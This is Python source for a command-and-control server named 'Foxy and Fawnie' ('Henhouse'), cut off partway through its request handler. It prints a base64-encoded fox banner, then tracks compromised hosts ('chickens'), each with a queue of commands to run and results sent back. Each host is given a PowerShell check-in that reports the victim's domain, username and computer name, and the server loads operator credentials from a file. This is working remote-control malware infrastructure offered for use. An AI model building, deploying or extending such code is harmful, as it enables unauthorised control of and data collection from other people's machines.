#   This is the server of the project Foxy and Fawnie in the henhouse, enjoy!
#   Special thanks to my little Fawnie and my Jedi master, 0xb4db01

from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console
import hashlib
import time
import json
import ssl
import random
import string
import argparse
import base64

parser = argparse.ArgumentParser(description='Code by: https://github.com/VolpinaRegina\nFoxy and Fawnie C2 Client', formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument("--host", help="IP", required=True)
parser.add_argument("--port", help="PORT", required=True)
parser.add_argument("-c", "--certificate", help="Certificate to use")
parser.add_argument("-k", "--privkey", help="Private key associated with the certificate")

args = parser.parse_args()

print('Code by: https://github.com/VolpinaRegina')
_B = 'ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbcmdiKDI1NSwyNDYsMjA4KV0uWy9yZ2IoMjU1LDI0NiwyMDgpXSAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW3JnYigyNTUsMjQ0LDE5OCldOlsvcmdiKDI1NSwyNDQsMTk4KV1bcmdiKDI1NSwyMzcsMTY2KV0uWy9yZ2IoMjU1LDIzNywxNjYpXSBbcmdiKDI1NSwyMTksNzkpXS1bL3JnYigyNTUsMjE5LDc5KV1bcmdiKDI1NSwyMzQsMTUyKV0uWy9yZ2IoMjU1LDIzNCwxNTIpXVtyZ2IoMjU1LDIzMywxNDkpXS5bL3JnYigyNTUsMjMzLDE0OSldW3JnYigyNTUsMjI2LDEwOSldLVsvcmdiKDI1NSwyMjYsMTA5KV0gICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbcmdiKDI1NSwyMzYsMTU4KV0uWy9yZ2IoMjU1LDIzNiwxNTgpXVtyZ2IoMjU1LDIxMiw0NyldLVsvcmdiKDI1NSwyMTIsNDcpXVtyZ2IoMjU1LDIwNCwxNildLVsvcmdiKDI1NSwyMDQsMTYpXVtyZ2IoMjU1LDIwNCwxNyldLVsvcmdiKDI1NSwyMDQsMTcpXVtyZ2IoMjU1LDIxMCwzNildLVsvcmdiKDI1NSwyMTAsMzYpXVtyZ2IoMjU1LDI1MiwyMTYpXS5bL3JnYigyNTUsMjUyLDIxNildICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW3JnYigyNDksMjQ1LDI1MCldLlsvcmdiKDI0OSwyNDUsMjUwKV1bcmdiKDI0MCwyMTAsMTczKV0tWy9yZ2IoMjQwLDIxMCwxNzMpXSAgIFtyZ2IoMTMwLDEzNiwxNTgpXT1bL3JnYigxMzAsMTM2LDE1OCldW3JnYigxMTQsMTE1LDEyOSldI1svcmdiKDExNCwxMTUsMTI5KV0gICAgCiAgICAgICAgICAgICAgICAgICAgICAgW3JnYigyNDQsMjE0LDIwNildLlsvcmdiKDI0NCwyMTQsMjA2KV1bcmdiKDI0MywyMTYsMjA3KV0uWy9yZ2IoMjQzLDIxNiwyMDcpXSAgICAgICAgICAgW3JnYigyMzUsMjM0LDIzMSldLlsvcmdiKDIzNSwyMzQsMjMxKV1bcmdiKDEzOCwxMTAsOTUpXSNbL3JnYigxMzgsMTEwLDk1KV1bcmdiKDI0MywxOTcsMTUyKV09Wy9yZ2IoMjQzLDE5NywxNTIpXVtyZ2IoMjQ4LDIxOCwxOTApXTpbL3JnYigyNDgsMjE4LDE5MCldW3JnYigxNjQsMTA4LDk0KV0jWy9yZ2IoMTY0LDEwOCw5NCldW3JnYig2MywxMiwxMildQFsvcmdiKDYzLDEyLDEyKV1bcmdiKDE5MCwxNzksMTczKV0tWy9yZ2IoMTkwLDE3OSwxNzMpXSAgICAKICAgICAgICAgICAgICAgICBbcmdiKDIyOCwxOTIsMTgyKV06Wy9yZ2IoMjI4LDE5MiwxODIpXVtyZ2IoMjA4LDE0NiwxMjEpXStbL3JnYigyMDgsMTQ2LDEyMSldW3JnYigyMDMsMTEyLDg2KV0qWy9yZ2IoMjAzLDExMiw4NildW3JnYigxOTgsMTAwLDY2KV0qWy9yZ2IoMTk4LDEwMCw2NildW3JnYigxODksODUsNDUpXSpbL3JnYigxODksODUsNDUpXVtyZ2IoMTgyLDY3LDIxKV0jWy9yZ2IoMTgyLDY3LDIxKV1bcmdiKDE4MSw2MSwxNCldI1svcmdiKDE4MSw2MSwxNCldW3JnYigxNzksNjIsMTgpXSNbL3JnYigxNzksNjIsMTgpXVtyZ2IoMTcxLDYzLDI2KV0jWy9yZ2IoMTcxLDYzLDI2KV1bcmdiKDE5Myw4OSw1MCldKlsvcmdiKDE5Myw4OSw1MCldW3JnYigyMTgsMTE5LDgxKV0qWy9yZ2IoMjE4LDExOSw4MSldW3JnYigyMjcsMTQ1LDExNildK1svcmdiKDIyNywxNDUsMTE2KV1bcmdiKDIzMywxNjgsMTQ3KV0tWy9yZ2IoMjMzLDE2OCwxNDcpXVtyZ2IoMjQwLDE5MiwxNzMpXTpbL3JnYigyNDAsMTkyLDE3MyldW3JnYigyNTAsMjE3LDIwNCldLlsvcmdiKDI1MCwyMTcsMjA0KV0gICBbcmdiKDI0NiwyMDcsMTg4KV0uWy9yZ2IoMjQ2LDIwNywxODgpXVtyZ2IoMjM5LDE2NywxMTEpXS1bL3JnYigyMzksMTY3LDExMSldW3JnYigxODMsMTA0LDM5KV0rWy9yZ2IoMTgzLDEwNCwzOSldW3JnYigxODMsMTE1LDY3KV0rWy9yZ2IoMTgzLDExNSw2NyldW3JnYigyMTQsMTAxLDE4KV0qWy9yZ2IoMjE0LDEwMSwxOCldW3JnYigyMzMsOTYsMTgpXStbL3JnYigyMzMsOTYsMTgpXVtyZ2IoMjM3LDEwMiwyMCldK1svcmdiKDIzNywxMDIsMjApXVtyZ2IoMjU1LDE5MSwxNDApXS1bL3JnYigyNTUsMTkxLDE0MCldICAgIAogICAgICAgICAgICAgIFtyZ2IoMjQzLDIyMywyMTcpXS5bL3JnYigyNDMsMjIzLDIxNyldW3JnYigyMjIsMTcyLDE1NildLVsvcmdiKDIyMiwxNzIsMTU2KV1bcmdiKDIwNCwxMjIsOTApXStbL3JnYigyMDQsMTIyLDkwKV1bcmdiKDE3NSw3MywzMyldKlsvcmdiKDE3NSw3MywzMyldW3JnYigxNzEsNjgsMTgpXSpbL3JnYigxNzEsNjgsMTgpXVtyZ2IoMTc4LDc0LDE1KV0jWy9yZ2IoMTc4LDc0LDE1KV1bcmdiKDE3Myw3MSwxMildI1svcmdiKDE3Myw3MSwxMildW3JnYigxNzAsNjUsOCldI1svcmdiKDE3MCw2NSw4KV1bcmdiKDE2NCw1MiwxKV0jWy9yZ2IoMTY0LDUyLDEpXVtyZ2IoMTY4LDUzLDIpXSNbL3JnYigxNjgsNTMsMildW3JnYigxNTksNDUsMSldI1svcmdiKDE1OSw0NSwxKV1bcmdiKDE1OCw1MCw0KV0jWy9yZ2IoMTU4LDUwLDQpXVtyZ2IoMTU4LDUxLDgpXSNbL3JnYigxNTgsNTEsOCldW3JnYigxNTEsMzcsMSldI1svcmdiKDE1MSwzNywxKV1bcmdiKDE1OCwzMywyKV0jWy9yZ2IoMTU4LDMzLDIpXVtyZ2IoMTY1LDQwLDQpXSNbL3JnYigxNjUsNDAsNCldW3JnYigxNjAsMzYsNSldJVsvcmdiKDE2MCwzNiw1KV1bcmdiKDE3Nyw1OSwxNildI1svcmdiKDE3Nyw1OSwxNildW3JnYigxNzYsNjksMjcpXSNbL3JnYigxNzYsNjksMjcpXVtyZ2IoMTk5LDg3LDQ1KV0qWy9yZ2IoMTk5LDg3LDQ1KV1bcmdiKDIwOCw4NiwzNSldKlsvcmdiKDIwOCw4NiwzNSldW3JnYigyMDIsNjcsMildKlsvcmdiKDIwMiw2NywyKV1bcmdiKDIwNyw2MSwwKV0qWy9yZ2IoMjA3LDYxLDApXVtyZ2IoMjE5LDg4LDQpXSpbL3JnYigyMTksODgsNCldW3JnYigyMTQsOTQsMTUpXStbL3JnYigyMTQsOTQsMTUpXVtyZ2IoMjIzLDg4LDApXStbL3JnYigyMjMsODgsMCldW3JnYigyMjAsNzMsMCldKlsvcmdiKDIyMCw3MywwKV1bcmdiKDIyMyw3OSwzKV0qWy9yZ2IoMjIzLDc5LDMpXVtyZ2IoMjQzLDExMCwzNCldK1svcmdiKDI0MywxMTAsMzQpXVtyZ2IoMjU1LDIwNCwxNjcpXTpbL3JnYigyNTUsMjA0LDE2NyldICAgCiAgICAgICAgICAgW3JnYigyMzMsMjE2LDIxMCldLlsvcmdiKDIzMywyMTYsMjEwKV1bcmdiKDE4MCwxMjgsMTE0KV0rWy9yZ2IoMTgwLDEyOCwxMTQpXVtyZ2IoMTU5LDc3LDQ2KV0jWy9yZ2IoMTU5LDc3LDQ2KV1bcmdiKDE5Miw5Niw0MCldKlsvcmdiKDE5Miw5Niw0MCldW3JnYigxOTYsOTcsNTIpXSpbL3JnYigxOTYsOTcsNTIpXVtyZ2IoMTY1LDcxLDI2KV0jWy9yZ2IoMTY1LDcxLDI2KV1bcmdiKDE0Nyw1OCwxNildI1svcmdiKDE0Nyw1OCwxNildW3JnYigxNTcsNjAsMTQpXSNbL3JnYigxNTcsNjAsMTQpXVtyZ2IoMTkyLDc4LDgpXSpbL3JnYigxOTIsNzgsOCldW3JnYigyMDcsOTEsMTUpXSpbL3JnYigyMDcsOTEsMTUpXVtyZ2IoMjA0LDg4LDE1KV0qWy9yZ2IoMjA0LDg4LDE1KV1bcmdiKDE4MCw2MSwyKV0qWy9yZ2IoMTgwLDYxLDIpXVtyZ2IoMTc1LDU1LDApXSNbL3JnYigxNzUsNTUsMCldW3JnYigxNzUsNTksMSldI1svcmdiKDE3NSw1OSwxKV1bcmdiKDE2Myw1MSwyKV0jWy9yZ2IoMTYzLDUxLDIpXVtyZ2IoMTY2LDUyLDMpXSNbL3JnYigxNjYsNTIsMyldW3JnYigxNTMsMzMsMCldI1svcmdiKDE1MywzMywwKV1bcmdiKDE3Niw1MiwwKV0jWy9yZ2IoMTc2LDUyLDApXVtyZ2IoMTk0LDY5LDIpXSNbL3JnYigxOTQsNjksMildW3JnYigxNjIsNDEsMildI1svcmdiKDE2Miw0MSwyKV1bcmdiKDE0OCwzMCwzKV0lWy9yZ2IoMTQ4LDMwLDMpXVtyZ2IoMTMzLDE0LDApXSVbL3JnYigxMzMsMTQsMCldW3JnYigxNjcsMzQsMCldI1svcmdiKDE2NywzNCwwKV1bcmdiKDE5NSw2MCwwKV0qWy9yZ2IoMTk1LDYwLDApXVtyZ2IoMjIyLDk0LDApXStbL3JnYigyMjIsOTQsMCldW3JnYigyMTMsMTE1LDQ1KV0rWy9yZ2IoMjEzLDExNSw0NSldW3JnYigyMzksMjA4LDE4MSldLVsvcmdiKDIzOSwyMDgsMTgxKV1bcmdiKDI1MiwyMjUsMjA0KV06Wy9yZ2IoMjUyLDIyNSwyMDQpXVtyZ2IoMjQwLDE2OSwxMjApXT1bL3JnYigyNDAsMTY5LDEyMCldW3JnYigyMTIsMTEzLDcwKV0qWy9yZ2IoMjEyLDExMyw3MCldW3JnYigxNjgsNjksNDMpXSVbL3JnYigxNjgsNjksNDMpXVtyZ2IoMTYzLDM5LDMpXSVbL3JnYigxNjMsMzksMyldW3JnYigyNDQsMTI2LDY2KV0rWy9yZ2IoMjQ0LDEyNiw2NildICAgCiAgICAgICAgIFtyZ2IoMjM2LDIxNSwyMDcpXS5bL3JnYigyMzYsMjE1LDIwNyldW3JnYigxODUsMTM3LDEyNCldK1svcmdiKDE4NSwxMzcsMTI0KV1bcmdiKDE0OSw4OSw2NildKlsvcmdiKDE0OSw4OSw2NildW3JnYigxNDUsNzcsNDApXSpbL3JnYigxNDUsNzcsNDApXVtyZ2IoMTgxLDc1LDEpXSpbL3JnYigxODEsNzUsMSldW3JnYigyMTksMTA4LDI1KV0rWy9yZ2IoMjE5LDEwOCwyNSldW3JnYigxOTQsOTcsNDQpXSpbL3JnYigxOTQsOTcsNDQpXVtyZ2IoMTc1LDg2LDM4KV0qWy9yZ2IoMTc1LDg2LDM4KV1bcmdiKDE5MSwxMDYsNjIpXSpbL3JnYigxOTEsMTA2LDYyKV1bcmdiKDE5MywxMDQsNjEpXStbL3JnYigxOTMsMTA0LDYxKV1bcmdiKDE4Myw3NiwxMyldKlsvcmdiKDE4Myw3NiwxMyldW3JnYigxOTksNzgsNSldI1svcmdiKDE5OSw3OCw1KV1bcmdiKDIzMCwxMDUsMTcpXSpbL3JnYigyMzAsMTA1LDE3KV1bcmdiKDIxNyw4NywwKV0qWy9yZ2IoMjE3LDg3LDApXVtyZ2IoMjA1LDc1LDApXSpbL3JnYigyMDUsNzUsMCldW3JnYigxOTAsNjMsMCldI1svcmdiKDE5MCw2MywwKV1bcmdiKDIwMyw3NywwKV0qWy9yZ2IoMjAzLDc3LDApXVtyZ2IoMjIzLDk1LDApXStbL3JnYigyMjMsOTUsMCldW3JnYigyMTgsODgsMCldKlsvcmdiKDIxOCw4OCwwKV1bcmdiKDIxOSw5MCwwKV0qWy9yZ2IoMjE5LDkwLDApXVtyZ2IoMjA1LDc5LDApXSpbL3JnYigyMDUsNzksMCldW3JnYigxNjksNDQsMSldI1svcmdiKDE2OSw0NCwxKV1bcmdiKDE1NywzMCwxKV0jWy9yZ2IoMTU3LDMwLDEpXVtyZ2IoMTcxLDQzLDApXSNbL3JnYigxNzEsNDMsMCldW3JnYigyMjMsOTcsMildK1svcmdiKDIyMyw5NywyKV1bcmdiKDIzMCwxMDYsMildK1svcmdiKDIzMCwxMDYsMildW3JnYigyNDIsMTMwLDE4KV0rWy9yZ2IoMjQyLDEzMCwxOCldW3JnYigyNDgsMjAwLDE1NSldLVsvcmdiKDI0OCwyMDAsMTU1KV1bcmdiKDIzNSwyMzAsMjI4KV06Wy9yZ2IoMjM1LDIzMCwyMjgpXVtyZ2IoMjMwLDIyMiwyMjQpXTpbL3JnYigyMzAsMjIyLDIyNCldW3JnYigyNDYsMjQ3LDI1MSldOlsvcmdiKDI0NiwyNDcsMjUxKV1bcmdiKDI0NiwyNDUsMjQ1KV06Wy9yZ2IoMjQ2LDI0NSwyNDUpXVtyZ2IoMjAyLDE4NCwxODUpXTpbL3JnYigyMDIsMTg0LDE4NSldW3JnYig4OCw1MCw1NildJVsvcmdiKDg4LDUwLDU2KV1bcmdiKDE2NSw4Myw1MildI1svcmdiKDE2NSw4Myw1MildW3JnYigyMzYsMTg3LDE1NCldLVsvcmdiKDIzNiwxODcsMTU0KV0gIAogICAgICAgW3JnYigyNDIsMjI4LDIyOSldLlsvcmdiKDI0MiwyMjgsMjI5KV1bcmdiKDIwNiwxNjksMTY0KV09Wy9yZ2IoMjA2LDE2OSwxNjQpXVtyZ2IoMTc4LDEyNSwxMDYpXStbL3JnYigxNzgsMTI1LDEwNildW3JnYigxMzcsNzksNTUpXSpbL3JnYigxMzcsNzksNTUpXVtyZ2IoMTM1LDY4LDMyKV0jWy9yZ2IoMTM1LDY4LDMyKV1bcmdiKDE1NSw3MSwxMildI1svcmdiKDE1NSw3MSwxMildW3JnYigyMTgsMTExLDM3KV0qWy9yZ2IoMjE4LDExMSwzNyldW3JnYigyNTAsMTg1LDE0MCldLVsvcmdiKDI1MCwxODUsMTQwKV1bcmdiKDIzNiwxODksMTY0KV0tWy9yZ2IoMjM2LDE4OSwxNjQpXVtyZ2IoMjA2LDEzNiw5OCldK1svcmdiKDIwNiwxMzYsOTgpXVtyZ2IoMTkyLDEwNSw0OCldKlsvcmdiKDE5MiwxMDUsNDgpXVtyZ2IoMTg3LDkwLDI3KV0qWy9yZ2IoMTg3LDkwLDI3KV1bcmdiKDE5NSwxMDEsMzMpXSpbL3JnYigxOTUsMTAxLDMzKV1bcmdiKDE4Nyw5MiwyMyldKlsvcmdiKDE4Nyw5MiwyMyldW3JnYigyMTgsMTUxLDkzKV09Wy9yZ2IoMjE4LDE1MSw5MyldW3JnYigyMTcsMTQzLDc5KV0rWy9yZ2IoMjE3LDE0Myw3OSldW3JnYigyMDYsODYsMyldK1svcmdiKDIwNiw4NiwzKV1bcmdiKDIzMSw5OCwzKV0rWy9yZ2IoMjMxLDk4LDMpXVtyZ2IoMjM3LDk4LDApXStbL3JnYigyMzcsOTgsMCldW3JnYigyMzYsOTcsMCldK1svcmdiKDIzNiw5NywwKV1bcmdiKDIyNSw5MywxKV0qWy9yZ2IoMjI1LDkzLDEpXVtyZ2IoMTkzLDY1LDApXSNbL3JnYigxOTMsNjUsMCldW3JnYigxOTksNzIsMCldKlsvcmdiKDE5OSw3MiwwKV1bcmdiKDE5MSw2MiwwKV0jWy9yZ2IoMTkxLDYyLDApXVtyZ2IoMTg0LDU0LDApXSNbL3JnYigxODQsNTQsMCldW3JnYigyMTYsMTAxLDIzKV0qWy9yZ2IoMjE2LDEwMSwyMyldW3JnYigyNTQsMjA0LDE1MildLVsvcmdiKDI1NCwyMDQsMTUyKV1bcmdiKDI1MiwyMDksMTY1KV0tWy9yZ2IoMjUyLDIwOSwxNjUpXVtyZ2IoMjM5LDIwNSwxNzEpXS1bL3JnYigyMzksMjA1LDE3MSldW3JnYigyMjYsMjE2LDIxMyldLVsvcmdiKDIyNiwyMTYsMjEzKV1bcmdiKDIxMywxOTgsMTk0KV0tWy9yZ2IoMjEzLDE5OCwxOTQpXVtyZ2IoMjE0LDIwMSwxOTkpXT1bL3JnYigyMTQsMjAxLDE5OSldW3JnYigyNDcsMjQ0LDI0NCldLlsvcmdiKDI0NywyNDQsMjQ0KV0gIFtyZ2IoMTUwLDEyOSwxNDYpXSpbL3JnYigxNTAsMTI5LDE0NildW3JnYigxOTksMTgyLDE5MyldPVsvcmdiKDE5OSwxODIsMTkzKV1bcmdiKDIyNCwyMTgsMjIxKV06Wy9yZ2IoMjI0LDIxOCwyMjEpXSAgCiAgICAgW3JnYigyMjQsMjEyLDIxNCldLlsvcmdiKDIyNCwyMTIsMjE0KV1bcmdiKDE4NywxNDcsMTQwKV0rWy9yZ2IoMTg3LDE0NywxNDApXVtyZ2IoMTU1LDkyLDcxKV0jWy9yZ2IoMTU1LDkyLDcxKV1bcmdiKDk4LDM1LDE5KV0lWy9yZ2IoOTgsMzUsMTkpXVtyZ2IoMTEwLDQ2LDIxKV0lWy9yZ2IoMTEwLDQ2LDIxKV1bcmdiKDEyOSw1NiwyNCldI1svcmdiKDEyOSw1NiwyNCldW3JnYigxMjAsNTEsMzApXSVbL3JnYigxMjAsNTEsMzApXVtyZ2IoMTYwLDExNywxMDQpXSpbL3JnYigxNjAsMTE3LDEwNCldW3JnYigyNDAsMjI2LDIyMCldLlsvcmdiKDI0MCwyMjYsMjIwKV0gICBbcmdiKDI0OCwyMjgsMjE1KV0uWy9yZ2IoMjQ4LDIyOCwyMTUpXVtyZ2IoMjIxLDE1OCwxMTMpXT1bL3JnYigyMjEsMTU4LDExMyldW3JnYigxNjEsNTYsOCldI1svcmdiKDE2MSw1Niw4KV1bcmdiKDExMSwyOCwyKV0lWy9yZ2IoMTExLDI4LDIpXVtyZ2IoMTQ3LDEwMyw4MCldKlsvcmdiKDE0NywxMDMsODApXVtyZ2IoMjE1LDIwMSwxOTMpXT1bL3JnYigyMTUsMjAxLDE5MyldW3JnYig2OCwzOSwzMSldQFsvcmdiKDY4LDM5LDMxKV1bcmdiKDg1LDM3LDExKV1AWy9yZ2IoODUsMzcsMTEpXVtyZ2IoMTU0LDc4LDM3KV0qWy9yZ2IoMTU0LDc4LDM3KV1bcmdiKDE3OSw3NywzMildI1svcmdiKDE3OSw3NywzMildW3JnYigxNjYsNTQsMCldI1svcmdiKDE2Niw1NCwwKV1bcmdiKDIwNiw4Miw1KV0qWy9yZ2IoMjA2LDgyLDUpXVtyZ2IoMjE4LDkzLDgpXSpbL3JnYigyMTgsOTMsOCldW3JnYigyMDgsOTAsMSldKlsvcmdiKDIwOCw5MCwxKV1bcmdiKDIyMCwxMTgsMzgpXStbL3JnYigyMjAsMTE4LDM4KV1bcmdiKDIzMCwxNDYsODMpXStbL3JnYigyMzAsMTQ2LDgzKV1bcmdiKDIyNiwxOTUsMTY3KV09Wy9yZ2IoMjI2LDE5NSwxNjcpXVtyZ2IoMjI0LDIxOCwyMTcpXS1bL3JnYigyMjQsMjE4LDIxNyldW3JnYigyMjUsMjIwLDIyMildLVsvcmdiKDIyNSwyMjAsMjIyKV1bcmdiKDI0MSwyMzYsMjM1KV06Wy9yZ2IoMjQxLDIzNiwyMzUpXSAgICAgICAgICAKICAgW3JnYigyMzUsMjI0LDIyOCldLlsvcmdiKDIzNSwyMjQsMjI4KV1bcmdiKDE4NSwxNDUsMTQxKV09Wy9yZ2IoMTg1LDE0NSwxNDEpXVtyZ2IoMTM0LDc3LDY0KV0jWy9yZ2IoMTM0LDc3LDY0KV1bcmdiKDEwNSw0MiwyMCldJVsvcmdiKDEwNSw0MiwyMCldW3JnYig3MSwxNSwzKV1AWy9yZ2IoNzEsMTUsMyldW3JnYig4NSwyOSwyMildQFsvcmdiKDg1LDI5LDIyKV1bcmdiKDE1NCwxMTAsMTAxKV0qWy9yZ2IoMTU0LDExMCwxMDEpXVtyZ2IoMjE0LDE5MywxODkpXTpbL3JnYigyMTQsMTkzLDE4OSldW3JnYigyMjcsMjIwLDIyMyldLlsvcmdiKDIyNywyMjAsMjIzKV0gICAgICAgW3JnYigxOTcsMTQ1LDEzNCldPVsvcmdiKDE5NywxNDUsMTM0KV1bcmdiKDc5LDQsMCldQFsvcmdiKDc5LDQsMCldW3JnYigxODYsMTUyLDE0MSldK1svcmdiKDE4NiwxNTIsMTQxKV1bcmdiKDI1NSwyNTUsMjU1KV0uWy9yZ2IoMjU1LDI1NSwyNTUpXVtyZ2IoMjE5LDIxMCwyMTApXS5bL3JnYigyMTksMjEwLDIxMCldW3JnYigxMTAsODMsODApXSNbL3JnYigxMTAsODMsODApXVtyZ2IoODAsNjAsNjUpXSVbL3JnYig4MCw2MCw2NSldW3JnYigxMzgsOTcsODYpXSNbL3JnYigxMzgsOTcsODYpXVtyZ2IoNDMsMCwwKV1AWy9yZ2IoNDMsMCwwKV1bcmdiKDgyLDIzLDUpXUBbL3JnYig4MiwyMyw1KV1bcmdiKDIyNCwxNzAsMTMzKV09Wy9yZ2IoMjI0LDE3MCwxMzMpXVtyZ2IoMjQ2LDIxOCwxOTMpXTpbL3JnYigyNDYsMjE4LDE5MyldW3JnYigyNDcsMjM3LDIzMSldLlsvcmdiKDI0NywyMzcsMjMxKV1bcmdiKDIzMCwyMTksMjIwKV06Wy9yZ2IoMjMwLDIxOSwyMjApXVtyZ2IoMTkyLDE3MSwxNjMpXS1bL3JnYigxOTIsMTcxLDE2MyldW3JnYigxNzcsMTU5LDE2MCldPVsvcmdiKDE3NywxNTksMTYwKV1bcmdiKDIxOSwyMTQsMjE3KV0uWy9yZ2IoMjE5LDIxNCwyMTcpXSAgICAgICAgICAgCiBbcmdiKDI0NiwyNDMsMjQ1KV0uWy9yZ2IoMjQ2LDI0MywyNDUpXVtyZ2IoMjA5LDE3OCwxNzEpXS1bL3JnYigyMDksMTc4LDE3MSldW3JnYigxNDAsODksODQpXSpbL3JnYigxNDAsODksODQpXVtyZ2IoOTIsNDQsMzcpXSNbL3JnYig5Miw0NCwzNyldW3JnYig2NCwzMywzNSldQFsvcmdiKDY0LDMzLDM1KV1bcmdiKDkxLDcyLDc1KV1AWy9yZ2IoOTEsNzIsNzUpXVtyZ2IoMTQ3LDEzOCwxNDMpXStbL3JnYigxNDcsMTM4LDE0MyldW3JnYigyMTcsMjEyLDIxOCldLlsvcmdiKDIxNywyMTIsMjE4KV0gICAgICAgICAgW3JnYigyMzMsMjIwLDIxNSldOlsvcmdiKDIzMywyMjAsMjE1KV1bcmdiKDE3Myw3NSwzMyldI1svcmdiKDE3Myw3NSwzMyldW3JnYigxODUsMTMwLDEwOCldK1svcmdiKDE4NSwxMzAsMTA4KV1bcmdiKDE5OCwyMDAsMjAyKV0uWy9yZ2IoMTk4LDIwMCwyMDIpXSBbcmdiKDI0MSwyMTcsMjA5KV06Wy9yZ2IoMjQxLDIxNywyMDkpXVtyZ2IoMTY2LDEyMywxMTApXSpbL3JnYigxNjYsMTIzLDExMCldW3JnYigxODUsMTU0LDE0OCldPVsvcmdiKDE4NSwxNTQsMTQ4KV1bcmdiKDI4LDE1LDE0KV1AWy9yZ2IoMjgsMTUsMTQpXVtyZ2IoMCwwLDIpXUBbL3JnYigwLDAsMildW3JnYigyMDcsMjA5LDIxMyldOlsvcmdiKDIwNywyMDksMjEzKV0gICBbcmdiKDIxNCwyMDEsMTk4KV06Wy9yZ2IoMjE0LDIwMSwxOTgpXVtyZ2IoMTIxLDEwMSwxMDgpXSNbL3JnYigxMjEsMTAxLDEwOCldW3JnYigzNCwyOSwzMyldQFsvcmdiKDM0LDI5LDMzKV1bcmdiKDE4OCwxODgsMTkwKV06Wy9yZ2IoMTg4LDE4OCwxOTApXSAgICAgICAgICAKIFtyZ2IoMjIzLDIxOSwyMjMpXS1bL3JnYigyMjMsMjE5LDIyMyldW3JnYigxNDgsMTMyLDEzOSldKlsvcmdiKDE0OCwxMzIsMTM5KV1bcmdiKDExOCwxMDUsMTIzKV0jWy9yZ2IoMTE4LDEwNSwxMjMpXVtyZ2IoMTY0LDE2MCwxNzApXT1bL3JnYigxNjQsMTYwLDE3MCldICAgICAgICAgICAgICAgW3JnYigyNTUsMjM5LDIyOSldOlsvcmdiKDI1NSwyMzksMjI5KV1bcmdiKDIxMywxNzQsMTU3KV0lWy9yZ2IoMjEzLDE3NCwxNTcpXVtyZ2IoMTIyLDg1LDcyKV1AWy9yZ2IoMTIyLDg1LDcyKV1bcmdiKDcwLDYzLDY0KV1AWy9yZ2IoNzAsNjMsNjQpXVtyZ2IoODYsODUsODgpXUBbL3JnYig4Niw4NSw4OCldW3JnYig1OCw0NCw0MCldQFsvcmdiKDU4LDQ0LDQwKV1bcmdiKDg1LDYyLDYxKV1AWy9yZ2IoODUsNjIsNjEpXVtyZ2IoMjAsMTMsMTQpXUBbL3JnYigyMCwxMywxNCldW3JnYigxMCwxMSwxNCldLVsvcmdiKDEwLDExLDE0KV0gICAgW3JnYigyNDMsMjQ0LDI0NSldPVsvcmdiKDI0MywyNDQsMjQ1KV1bcmdiKDEzNSwxMjcsMTI4KV1AWy9yZ2IoMTM1LDEyNywxMjgpXVtyZ2IoOCw1LDkpXT1bL3JnYig4LDUsOSldICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgIFtyZ2IoMTk3LDE4OSwxODgpXS5bL3JnYigxOTcsMTg5LDE4OCldW3JnYig5Nyw5NSw5OCldI1svcmdiKDk3LDk1LDk4KV1bcmdiKDU1LDUzLDU5KV1AWy9yZ2IoNTUsNTMsNTkpXVtyZ2IoMTY1LDE1OSwxNjUpXT1bL3JnYigxNjUsMTU5LDE2NSldW3JnYigxNzcsMTcxLDE3NyldPVsvcmdiKDE3NywxNzEsMTc3KV1bcmdiKDY1LDYyLDY5KV1AWy9yZ2IoNjUsNjIsNjkpXVtyZ2IoMTU2LDE1NSwxNTcpXTpbL3JnYigxNTYsMTU1LDE1NyldICBbcmdiKDIzMiwyMjksMjMxKV0uWy9yZ2IoMjMyLDIyOSwyMzEpXVtyZ2IoMTAyLDk3LDEwNildQFsvcmdiKDEwMiw5NywxMDYpXVtyZ2IoOTAsODksMTAwKV0lWy9yZ2IoOTAsODksMTAwKV1bcmdiKDE4OCwxODgsMTk0KV06Wy9yZ2IoMTg4LDE4OCwxOTQpXSAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICBbcmdiKDI1NSwyNTUsMjU1KV0uWy9yZ2IoMjU1LDI1NSwyNTUpXVtyZ2IoMjU1LDI1NSwyNTUpXS5bL3JnYigyNTUsMjU1LDI1NSldW3JnYigyNTUsMjU1LDI1NSldLlsvcmdiKDI1NSwyNTUsMjU1KV0gICBbcmdiKDIxMiwyMDksMjEyKV0uWy9yZ2IoMjEyLDIwOSwyMTIpXVtyZ2IoMTE1LDEwOSwxMTcpXSpbL3JnYigxMTUsMTA5LDExNyldW3JnYigxMTAsMTA1LDExOCldJVsvcmdiKDExMCwxMDUsMTE4KV1bcmdiKDE5MiwxOTAsMTk2KV0rWy9yZ2IoMTkyLDE5MCwxOTYpXSAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo='
Console().print(base64.b64decode(_B).decode())
print('\t[Henhouse]')
print('\n')



def random_alpha_string(N: int) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=N))
class Chicken:
    def __init__(self, _cid: str, _cname: str, _ip: str) -> None:
        self.cid = _cid
        self.ip = _ip
        self.cname = _cname
        self.comm = []
        self.data = {}
        self.checkin_comm = "Write-Host $env:USERDOMAIN\\$env:USERNAME [$env:COMPUTERNAME] "
        self.checkin_data = ''
        self.last_time = time.time()
        
        return
    def get_comm(self):
        _c = self.comm
        self.comm = []
        self.last_time = time.time()
        return _c
        
    def set_comm(self, _comm) -> None:
        self.comm.append(_comm)
        return
        
    def set_data(self, _data) -> None:
        self.data = _data
        self.last_time = time.time()
        return
        
    def get_data(self):
        _d = self.data
        self.data = ''
        return _d
    def get_elapsed(self):
        elapsed = time.time() - self.last_time
        return elapsed

class Henhouse:
    def __init__(self) -> None:
        self.notifications = ''
        return
    
    def get_notifications(self) -> str:
        _n = self.notifications
        self.notifications = ''
        return _n[:-1]
    
    def set_notification(self, _n: str) -> None:
        self.notifications += _n
        return


_fs = open("Data/creds.json","r")
_fc = _fs.read()
_fs.close()
Creds = json.loads(_fc)
henhouse = Henhouse()
allowed_tokens = []
Chicken_list = {}






class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        global command, response

        print("GET", self.path)
        data = {}
        if self.path == '/_ping':
